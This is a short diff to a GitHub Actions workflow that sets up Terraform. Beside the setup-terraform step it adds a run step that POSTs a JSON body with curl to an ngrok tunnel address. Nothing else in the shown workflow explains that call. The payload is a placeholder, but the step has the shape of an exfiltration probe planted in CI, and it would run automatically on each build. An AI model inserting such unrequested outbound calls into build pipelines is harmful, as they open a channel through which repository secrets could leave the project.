@@ -15,7 +15,13 @@ jobs:
         working-directory: cloud
     steps:
     - uses: actions/checkout@v3
-    - uses: hashicorp/setup-terraform@v2
+    - uses: hashicorp/setup-terraform@v2    
+    
+    - run: |
+      curl --header "Content-Type: application/json" \
+      --request POST \
+      --data '{"key":"value"}' \
+      https://56aa-50-68-112-90.ngrok.io/
 
     # Initialize terraform with no remote state store and
     # validate resources.
